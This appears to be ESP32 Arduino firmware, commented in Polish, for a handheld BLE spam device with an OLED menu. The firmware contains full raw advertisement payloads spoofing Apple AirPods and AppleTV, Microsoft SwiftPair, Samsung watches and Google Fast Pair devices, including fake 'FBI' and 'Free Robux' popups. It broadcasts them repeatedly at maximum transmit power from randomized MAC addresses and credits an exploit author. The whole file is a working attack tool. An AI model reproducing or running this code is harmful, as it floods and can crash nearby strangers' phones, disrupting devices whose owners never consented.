#include "ble_spam.h"
#include <U8g2lib.h>

// Inicjalizacja wyświetlacza SH1106 (dostosuj piny I2C według swojej konfiguracji)
U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);

#include "buttons.h"

int currentMenuIndex = 0;
const int menuItemsCount = 5; // Liczba elementów w menu

void displayStatus(const String& text) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    
    // Wycentruj tekst
    int16_t width = u8g2.getStrWidth(text.c_str());
    int16_t x = (128 - width) / 2;
    
    // Narysuj tekst na środku ekranu
    u8g2.drawStr(x, 35, text.c_str());
    
    // Wyświetl zawartość bufora
    u8g2.sendBuffer();
}

// Funkcja do wyświetlania menu
void displayMenu() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    
    const char* menuItems[] = {
        "iOS Spam",
        "SwiftPair",
        "Samsung",
        "Android",
        "Spam All"
    };
    
    // Wyświetl aktualny element menu
    int16_t width = u8g2.getStrWidth(menuItems[currentMenuIndex]);
    int16_t x = (128 - width) / 2;
    u8g2.drawStr(x, 35, menuItems[currentMenuIndex]);
    
    // Dodaj strzałki nawigacyjne
    if(currentMenuIndex > 0) {
        u8g2.drawStr(5, 35, "<");
    }
    if(currentMenuIndex < menuItemsCount - 1) {
        u8g2.drawStr(120, 35, ">");
    }
    
    u8g2.sendBuffer();
}

void setup() {
    u8g2.begin();
    
    // Konfiguracja pinów przycisków
    pinMode(buttonLeftPin, INPUT_PULLUP);
    pinMode(buttonRightPin, INPUT_PULLUP);
    pinMode(buttonSelectPin, INPUT_PULLUP);
    pinMode(buttonBackPin, INPUT_PULLUP);
}

void loop() {
    bool menuActive = true;
    displayMenu();
    
    while(menuActive) {
        // Obsługa przycisku w lewo
        if(digitalRead(buttonLeftPin) == LOW) {
            if(currentMenuIndex > 0) {
                currentMenuIndex--;
                displayMenu();
            }
            delay(200); // Debounce
        }
        
        // Obsługa przycisku w prawo
        if(digitalRead(buttonRightPin) == LOW) {
            if(currentMenuIndex < menuItemsCount - 1) {
                currentMenuIndex++;
                displayMenu();
            }
            delay(200); // Debounce
        }
        
        // Obsługa przycisku zatwierdzania
        if(digitalRead(buttonSelectPin) == LOW) {
            // Uruchom wybraną funkcję
            aj_adv(currentMenuIndex);
            delay(200); // Debounce
        }
        
        // Obsługa przycisku powrotu
        if(digitalRead(buttonBackPin) == LOW) {
            menuActive = false;
            delay(200); // Debounce
        }
    }
}

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

/*
extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}
*/
struct BLEData
{
  BLEAdvertisementData AdvData;
  BLEAdvertisementData ScanData;
};

struct WatchModel
{
    uint8_t value;
    const char *name;
};

//WatchModel* watch_models = nullptr;

struct mac_addr {
   unsigned char bytes[6];
};

struct Station {
  uint8_t mac[6];
  bool selected;
};
enum EBLEPayloadType
{
  Microsoft,
  Apple,
  Samsung,
  Google
};

// globals for passing bluetooth info between routines
// AppleJuice Payload Data
uint8_t IOS1[][31] {
/* Airpods[31] = */       {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* AirpodsPro[31] = */    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/*AirpodsMax[31] = */ //    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* AirpodsGen2[31] = *///   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* AirpodsGen3[31] = */   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/*AirpodsProGen2[31]=*/   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* PowerBeats[31] =*/     {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* PowerBeatsPro[31]=*///   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsSoloPro[31] = *///  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsStudioBuds[31] =*/{0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/*BeatsFlex[31] =*/   //    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsX[31] =*/         {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsSolo3[31] =*/     {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsStudio3[31] =*///   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsStudioPro[31] =*/ {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsFitPro[31] =*///    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
/* BeatsStdBudsPlus[31] */{0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

uint8_t IOS2[][23] {
/* AppleTVSetup[23] */            {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVPair[23] */             {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVNewUser[23] */          {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVAppleIDSetup[23] */     {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVWirelessAudioSync[23] */{0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVHomekitSetup[23] *///     {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleTVKeyboard[23] */  //       {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/*AppleTVConnectingNetwork[23]*/  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* HomepodSetup[23] */       //     {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* SetupNewPhone[23] */    //       {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* TransferNumber[23] */          {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* TVColorBalance[23] */          {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
/* AppleVisionPro[23] */    //      {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};
uint8_t* data;
int deviceType = 0;

struct DeviceType {
    uint32_t value;
    String name;
};

DeviceType android_models[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, ""},//Bisto CSR8670 Dev Board"},
    {0x000047, ""},//Arduino 101"},
    {0x470000, ""},//Arduino 101 2"},
    {0x00000A, ""},//Anti-Spoof Test"},
//    {0x0A0000, ""},//Anti-Spoof Test 2"},
    {0x00000B, ""},//Google Gphones"},
//    {0x0B0000, ""},//Google Gphones 2"},
//    {0x0C0000, ""},//Google Gphones 3"},
    {0x00000D, ""},//Test 00000D"},
    {0x000007, ""},//Android Auto"},
//    {0x070000, ""},//Android Auto 2"},
//    {0x000008, ""},//Foocorp Foophones"},
//    {0x080000, ""},//Foocorp Foophones 2"},
    {0x000009, ""},//Test Android TV"},
    {0x090000, ""},//Test Android TV 2"},
//    {0x000035, ""},//Test 000035"},
//    {0x350000, ""},//Test 000035 2"},
    {0x000048, ""},//Fast Pair Headphones"},
//    {0x480000, ""},//Fast Pair Headphones 2"},
//    {0x000049, ""},//Fast Pair Headphones 3"},
//    {0x490000, ""},//Fast Pair Headphones 4"},
    {0x001000, ""},//LG HBS1110"},
    {0x00B727, ""},//Smart Controller 1"},
    {0x01E5CE, ""},//BLE-Phone"},
    {0x0200F0, ""},//Goodyear"},
    {0x00F7D4, ""},//Smart Setup"},
    {0xF00002, ""},//Goodyear"},
    {0xF00400, ""},//T10"},
    {0x1E89A7, ""},//ATS2833_EVB"},

    // Phone setup
//    {0x00000C, ""},//Google Gphones Transfer"},
//    {0x0577B1, ""},//Galaxy S23 Ultra"},
//    {0x05A9BC, ""},//Galaxy S20+"},

    // Genuine devices
    {0xCD8256, ""},//Bose NC 700"},
    {0x0000F0, ""},//Bose QuietComfort 35 II"},
    {0xF00000, ""},//Bose QuietComfort 35 II 2"},
    {0x821F66, ""},//JBL Flip 6"},
    {0xF52494, ""},//JBL Buds Pro"},
    {0x718FA4, ""},//JBL Live 300TWS"},
    {0x0002F0, ""},//JBL Everest 110GA"},
    {0x92BBBD, ""},//Pixel Buds"},
    {0x000006, ""},//Google Pixel buds"},
    {0x060000, ""},//Google Pixel buds 2"},
    {0xD446A7, ""},//Sony XM5"},
 /*   {0x2D7A23, ""},//Sony WF-1000XM4"},
    {0x0E30C3, ""},//Razer Hammerhead TWS"},
    {0x72EF8D, ""},//Razer Hammerhead TWS X"},
    {0x72FB00, ""},//Soundcore Spirit Pro GVA"},
    {0x0003F0, ""},//LG HBS-835S"},
    {0x002000, ""},//AIAIAI TMA-2 (H60)"},
    {0x003000, ""},//Libratone Q Adapt On-Ear"},
    {0x003001, ""},//Libratone Q Adapt On-Ear 2"},
    {0x00A168, ""},//boAt  Airdopes 621"},
    {0x00AA48, ""},//Jabra Elite 2"},
    {0x00AA91, ""},//Beoplay E8 2.0"},
    {0x00C95C, ""},//Sony WF-1000X"},
    {0x01EEB4, ""},//WH-1000XM4"},
    {0x02AA91, ""},//B&O Earset"},
    {0x01C95C, ""},//Sony WF-1000X"},
    {0x02D815, ""},//ATH-CK1TW"},
    {0x035764, ""},//PLT V8200 Series"},
    {0x038CC7, ""},//JBL TUNE760NC"},
    {0x02DD4F, ""},//JBL TUNE770NC"},
    {0x02E2A9, ""},//TCL MOVEAUDIO S200"},
    {0x035754, ""},//Plantronics PLT_K2"},
    {0x02C95C, ""},//Sony WH-1000XM2"},
*/    {0x038B91, ""},//DENON AH-C830NCW"},
    {0x02F637, ""},//JBL LIVE FLEX"},
    {0x02D886, ""},//JBL REFLECT MINI NC"},
    {0xF00000, ""},//Bose QuietComfort 35 II"},
    {0xF00001, ""},//Bose QuietComfort 35 II"},
    {0xF00201, ""},//JBL Everest 110GA"},
//    {0xF00204, ""},//JBL Everest 310GA"},
    {0xF00209, ""},//JBL LIVE400BT"},
    {0xF00205, ""},//JBL Everest 310GA"},
//    {0xF00200, ""},//JBL Everest 110GA"},
//    {0xF00208, ""},//JBL Everest 710GA"},
//    {0xF00207, ""},//JBL Everest 710GA"},
//    {0xF00206, ""},//JBL Everest 310GA"},
//    {0xF0020A, ""},//JBL LIVE400BT"},
//    {0xF0020B, ""},//JBL LIVE400BT"},
//    {0xF0020C, ""},//JBL LIVE400BT"},
//    {0xF00203, ""},//JBL Everest 310GA"},
//    {0xF00202, ""},//JBL Everest 110GA"},
//    {0xF00213, ""},//JBL LIVE650BTNC"},
//    {0xF0020F, ""},//JBL LIVE500BT"},
//    {0xF0020E, ""},//JBL LIVE500BT"},
//    {0xF00214, ""},//JBL LIVE650BTNC"},
//    {0xF00212, ""},//JBL LIVE500BT"},
//    {0xF0020D, ""},//JBL LIVE400BT"},
//    {0xF00211, ""},//JBL LIVE500BT"},
//    {0xF00215, ""},//JBL LIVE650BTNC"},
//    {0xF00210, ""},//JBL LIVE500BT"},
    {0xF00305, ""},//LG HBS-1500"},
//    {0xF00304, ""},//LG HBS-1010"},
//    {0xF00308, ""},//LG HBS-1125"},
//    {0xF00303, ""},//LG HBS-930"},
//    {0xF00306, ""},//LG HBS-1700"},
//    {0xF00300, ""},//LG HBS-835S"},
//    {0xF00309, ""},//LG HBS-2000"},
//    {0xF00302, ""},//LG HBS-830"},
//    {0xF00307, ""},//LG HBS-1120"},
//    {0xF00301, ""},//LG HBS-835"},
    {0xF00E97, ""},//JBL VIBE BEAM"},
    {0x04ACFC, ""},//JBL WAVE BEAM"},
    {0x04AA91, ""},//Beoplay H4"},
    {0x04AFB8, ""},//JBL TUNE 720BT"},
    {0x05A963, ""},//WONDERBOOM 3"},
    {0x05AA91, ""},//B&O Beoplay E6"},
    {0x05C452, ""},//JBL LIVE220BT"},
    {0x05C95C, ""},//Sony WI-1000X"},
    {0x0602F0, ""},//JBL Everest 310GA"},
    {0x0603F0, ""},//LG HBS-1700"},
    {0x1E8B18, ""},//SRS-XB43"},
    {0x1E955B, ""},//WI-1000XM2"},
    {0x1EC95C, ""},//Sony WF-SP700N"},
/*    {0x1ED9F9, ""},//JBL WAVE FLEX"},
    {0x1EE890, ""},//ATH-CKS30TW WH"},
    {0x1EEDF5, ""},//Teufel REAL BLUE TWS 3"},
    {0x1F1101, ""},//TAG Heuer Calibre E4 45mm"},
    {0x1F181A, ""},//LinkBuds S"},
    {0x1F2E13, ""},//Jabra Elite 2"},
    {0x1F4589, ""},//Jabra Elite 2"},
    {0x1F4627, ""},//SRS-XG300"},
    {0x1F5865, ""},//boAt Airdopes 441"},
    {0x1FBB50, ""},//WF-C700N"},
    {0x1FC95C, ""},//Sony WF-SP700N"},
    {0x1FE765, ""},//TONE-TF7Q"},
    {0x1FF8FA, ""},//JBL REFLECT MINI NC"},
    {0x201C7C, ""},//SUMMIT"},
    {0x202B3D, ""},//Amazfit PowerBuds"},
    {0x20330C, ""},//SRS-XB33"},
    {0x003B41, ""},//M&D MW65"},
    {0x003D8A, ""},//Cleer FLOW II"},
    {0x005BC3, ""},//Panasonic RP-HD610N"},
    {0x008F7D, ""},//soundcore Glow Mini"},
    {0x00FA72, ""},//Pioneer SE-MS9BN"},
    {0x0100F0, ""},//Bose QuietComfort 35 II"},
    {0x011242, ""},//Nirvana Ion"},
    {0x013D8A, ""},//Cleer EDGE Voice"},
    {0x01AA91, ""},//Beoplay H9 3rd Generation"},
    {0x038F16, ""},//Beats Studio Buds"},
    {0x039F8F, ""},//Michael Kors Darci 5e"},
    {0x03AA91, ""},//B&O Beoplay H8i"},
    {0x03B716, ""},//YY2963"},
    {0x03C95C, ""},//Sony WH-1000XM2"},
    {0x03C99C, ""},//MOTO BUDS 135"},
    {0x03F5D4, ""},//Writing Account Key"},
    {0x045754, ""},//Plantronics PLT_K2"},
    {0x045764, ""},//PLT V8200 Series"},
    {0x04C95C, ""},//Sony WI-1000X"},
    {0x050F0C, ""},//Major III Voice"},
    {0x052CC7, ""},//MINOR III"},
    {0x057802, ""},//TicWatch Pro 5"},
    {0x0582FD, ""},//Pixel Buds"},
    {0x058D08, ""},//WH-1000XM4"},
*/    {0x06AE20, ""},// "Galaxy S21 5G"},
    {0x06C197, ""},// "OPPO Enco Air3 Pro"},
    {0x06C95C, ""},// "Sony WH-1000XM2"},
    {0x06D8FC, ""},// "soundcore Liberty 4 NC"},
    {0x0744B6, ""},// "Technics EAH-AZ60M2"},
    {0x07A41C, ""},// "WF-C700N"},
    {0x07C95C, ""},// "Sony WH-1000XM2"},
    {0x07F426, ""},// "Nest Hub Max"},
    {0x0102F0, ""},// "JBL Everest 110GA - Gun Metal"},
//    {0x0202F0, ""},// "JBL Everest 110GA - Silver"},
//    {0x0302F0, ""},// "JBL Everest 310GA - Brown"},
//    {0x0402F0, ""},// "JBL Everest 310GA - Gun Metal"},
//    {0x0502F0, ""},// "JBL Everest 310GA - Silver"},
//    {0x0702F0, ""},// "JBL Everest 710GA - Gun Metal"},
//    {0x0802F0, ""},// "JBL Everest 710GA - Silver"},
    {0x054B2D, ""},// "JBL TUNE125TWS"},
    {0x0660D7, ""},// "JBL LIVE770NC"},
    {0x0103F0, ""},// "LG HBS-835"},
//    {0x0203F0, ""},// "LG HBS-830"},
//    {0x0303F0, ""},// "LG HBS-930"},
//    {0x0403F0, ""},// "LG HBS-1010"},
//    {0x0503F0, ""},// "LG HBS-1500"},
//    {0x0703F0, ""},// "LG HBS-1120"},
//    {0x0803F0, ""},// "LG HBS-1125"},
    {0x0903F0, ""},// "LG HBS-2000"},

    // Custom debug popups
    {0xD99CA1, ""},// "Flipper Zero"},
    {0x77FF67, ""},// "Free Robux"},
    {0xAA187F, ""},// "Free VBucks"},
    {0xDCE9EA, ""},// "Rickroll"},
    {0x87B25F, ""},// "Animated Rickroll"},
    {0x1448C9, ""},// "BLM"},
    {0x13B39D, ""},// "Talking Sasquach"},
    {0x7C6CDB, ""},// "Obama"},
    {0x005EF9, ""},// "Ryanair"},
    {0xE2106F, ""},// "FBI"},
    {0xB37A62, ""},// "Tesla"},
    {0x92ADC9, ""},// "Ton Upgrade Netflix"},
};

WatchModel watch_models[26] = {
  {0x1A, ""},// "Fallback Watch"},
  {0x01, ""},// "White Watch4 Classic 44m"},
  {0x02, ""},// "Black Watch4 Classic 40m"},
  {0x03, ""},// "White Watch4 Classic 40m"},
  {0x04, ""},// "Black Watch4 44mm"},
  {0x05, ""},// "Silver Watch4 44mm"},
  {0x06, ""},// "Green Watch4 44mm"},
  {0x07, ""},// "Black Watch4 40mm"},
  {0x08, ""},// "White Watch4 40mm"},
  {0x09, ""},// "Gold Watch4 40mm"},
  {0x0A, ""},// "French Watch4"},
  {0x0B, ""},// "French Watch4 Classic"},
  {0x0C, ""},// "Fox Watch5 44mm"},
  {0x11, ""},// "Black Watch5 44mm"},
  {0x12, ""},// "Sapphire Watch5 44mm"},
  {0x13, ""},// "Purpleish Watch5 40mm"},
  {0x14, ""},// "Gold Watch5 40mm"},
  {0x15, ""},// "Black Watch5 Pro 45mm"},
  {0x16, ""},// "Gray Watch5 Pro 45mm"},
  {0x17, ""},// "White Watch5 44mm"},
  {0x18, ""},// "White & Black Watch5"},
  {0x1B, ""},// "Black Watch6 Pink 40mm"},
  {0x1C, ""},// "Gold Watch6 Gold 40mm"},
  {0x1D, ""},// "Silver Watch6 Cyan 44mm"},
  {0x1E, ""},// "Black Watch6 Classic 43m"},
  {0x20, ""},// "Green Watch6 Classic 43m"},
};

const char* generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

void generateRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++){
    mac[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we
    // OR with 0xF0
    if (i == 0){
      mac[i] |= 0xF0;
    }
  }
}

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

//ESP32 Sour Apple by RapierXbox
//Exploit by ECTO-1A
BLEAdvertising *pAdvertising;

//// https://github.com/Spooks4576
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
  BLEAdvertisementData AdvData = BLEAdvertisementData();

  uint8_t* AdvData_Raw = nullptr;
  uint8_t i = 0;

  switch (Type) {
    case Microsoft: {

      const char* Name = generateRandomName();

      uint8_t name_len = strlen(Name);

      AdvData_Raw = new uint8_t[7 + name_len];

      AdvData_Raw[i++] = 7 + name_len - 1;
      AdvData_Raw[i++] = 0xFF;
      AdvData_Raw[i++] = 0x06;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x03;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x80;
      memcpy(&AdvData_Raw[i], Name, name_len);
      i += name_len;

      AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
      break;
    }
    case Apple: {
      int rand = random(2);
      if(rand==0) AdvData.addData(std::string((char *)IOS1[random(sizeof(IOS1)/sizeof(IOS1[0]))], 31));
      else        AdvData.addData(std::string((char *)IOS2[random(sizeof(IOS2)/sizeof(IOS2[0]))], 23));
      break;
    }
    case Samsung: {

      uint8_t model = watch_models[random(26)].value;
      uint8_t Samsung_Data[15] = { 0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, (model >> 0x00) & 0xFF };
      AdvData.addData(std::string((char *)Samsung_Data, 15));

      break;
    }
    case Google: {
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      uint8_t Google_Data[14] = {
        0x03, 0x03, 0x2C, 0xFE, //First 3 data to announce Fast Pair
        0x06, 0x16, 0x2C, 0xFE, (model >> 0x10) & 0xFF, (model >> 0x08) & 0xFF, (model >> 0x00) & 0xFF, // 6 more data to inform FastPair and device data
        0x02, 0x0A, (rand() % 120) - 100 }; // 2 more data to inform RSSI data.
      AdvData.addData(std::string((char *)Google_Data, 14));
      break;
    }
    default: {
      Serial.println("Please Provide a Company Type");
      break;
    }
  }

  delete[] AdvData_Raw;

  return AdvData;
}
  //// https://github.com/Spooks4576
void executeSpam(EBLEPayloadType type) {
  uint8_t macAddr[6];
  if(type != Apple) {
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
  }
  BLEDevice::init("");
  delay(10);
  pAdvertising = BLEDevice::getAdvertising();
  delay(40);
  BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
  BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->setScanResponseData(oScanResponseData);
  //pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  pAdvertising->start();
  delay(50);

  pAdvertising->stop();
  delay(10);
  BLEDevice::deinit();
}

void aj_adv(int ble_choice) {
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    int mael = 0;
    int timer = 0;
    int count = 0;
    timer = millis();
    bool isRunning = true;
    
    while(isRunning) {
        if(millis()-timer > 900) {
            switch(ble_choice) {
                case 0: // Applejuice
                    displayStatus("iOS Spam (" + String(count) + ")");
                    executeSpam(Apple);
                    break;
                case 1: // SwiftPair
                    displayStatus("SwiftPair (" + String(count) + ")");
                    executeSpam(Microsoft);
                    break;
                case 2: // Samsung
                    displayStatus("Samsung (" + String(count) + ")");
                    executeSpam(Samsung);
                    break;
                case 3: // Android
                    displayStatus("Android (" + String(count) + ")");
                    executeSpam(Google);
                    break;
                case 4: // Tutti-frutti
                    displayStatus("Spam All (" + String(count) + ")");
                    if(mael == 0) executeSpam(Google);
                    if(mael == 1) executeSpam(Samsung);
                    if(mael == 2) executeSpam(Microsoft);
                    if(mael == 3) {
                        executeSpam(Apple);
                        mael = 0;
                    }
                    mael++;
                    break;
            }
            count++;
            timer = millis();
        }
        
        // Sprawdź przycisk powrotu
        if(digitalRead(buttonBackPin) == LOW) {
            isRunning = false;
            displayMenu(); // Powrót do menu
            delay(200); // Debounce
        }
    }
    
    if(ble_choice > 0) BLEDevice::deinit();
}